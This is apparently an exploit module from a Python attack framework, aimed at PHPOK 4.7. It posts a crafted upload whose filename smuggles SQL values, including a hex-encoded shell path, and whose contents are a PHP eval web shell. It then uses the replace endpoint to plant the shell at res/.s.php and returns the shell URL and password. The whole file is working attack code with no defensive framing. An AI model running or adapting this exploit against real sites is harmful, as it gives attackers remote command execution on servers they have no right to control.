'''
PHPOA 4.7 EXP
'''
# -*- coding: utf-8 -*-
import base64
from models.payload import Payload,PayloadFailException
import modules.request.req as req
from models.horse import Horse
from configuration import configuration as config
from utils import Utils
import re
import binascii

class P(Payload):
    def attack(self):
        shellpath = 'res/.s.php'
        phpsession = ''
        url = 'http://{}/index.php?c=upload&f=save'.format(self.host)
        files = [
            ('upfile', ("1','r7ip15ijku7jeu1s1qqnvo9gj0','30',''),('1',0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,'',0x"+binascii.b2a_hex(shellpath.encode()).decode()+",'1495536080','2.jpg",
                        '<?php @eval($_POST[cmd]);?>', 'image/jpg')),
        ]
        horse = Horse(self.host)
        files1 = {
            'upfile':('1.jpg', horse.simple, 'image/jpg')
        }
        cookies = {'PHPSESSION': phpsession}
        r = req.post(url, files=files, cookies=cookies)
        response = r.text
        id = re.search('"id":"(\d+)"', response, re.S).group(1)
        id = int(id) + 1
        url = 'http://{}/index.php?c=upload&f=replace&oldid={}'.format(self.host,id)
        r = req.post(url, files=files1, cookies=cookies)
        shell = 'http://{}/{}'.format(self.host,shellpath)
        response = req.get(shell)
        if response.status_code == 200:
            return shell,horse.password
        raise PayloadFailException('PHPOK V4.7 payload fail')
